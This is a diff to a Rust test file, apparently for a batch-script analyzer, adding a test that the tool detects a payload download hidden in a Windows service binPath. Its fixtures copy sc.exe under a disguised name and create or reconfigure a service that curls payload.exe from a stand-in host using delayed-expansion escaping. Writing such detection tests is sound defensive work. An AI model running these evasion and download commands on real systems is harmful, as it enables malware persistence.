@@ -50116,6 +50116,24 @@ C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.ex
     }
 
     #[test]
+    fn copied_sc_alias_comspec_binpath_preserves_escaped_delayed_expansion() {
+        let script = br#"copy C:\Windows\System32\sc.exe C:\Users\Public\svc.tmp
+C:\Users\Public\svc.tmp create UpdateSvc binPath= "%COMSPEC% /V:ON /c set U=https://copied-sc-delayed.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-sc-delayed.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied sc delayed binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn sc_config_binpath_cmd_child_is_analyzed() {
         let script = br#"sc config UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://sc-config-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
